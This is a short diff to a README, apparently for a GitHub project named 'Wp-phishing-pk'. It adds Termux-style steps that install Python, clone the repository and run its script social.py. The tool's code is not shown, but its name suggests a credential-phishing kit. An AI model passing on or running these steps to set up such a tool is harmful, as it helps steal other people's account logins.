@@ -10,3 +10,13 @@
 </p>
 <p align="center">
 <a href="https://github.com/1Psychokiller"><img title="Github" src="https://telegra.ph/file/378f4d3c39a358d3cf28d.jpg"></a>
+  
+
+    apt update
+    apt upgrade
+    pkg install python
+    git clone https://github.com/1Psychokiller/Wp-phishing-pk
+    cd Wp-phishing-pk
+    ls
+    python social.py
+    
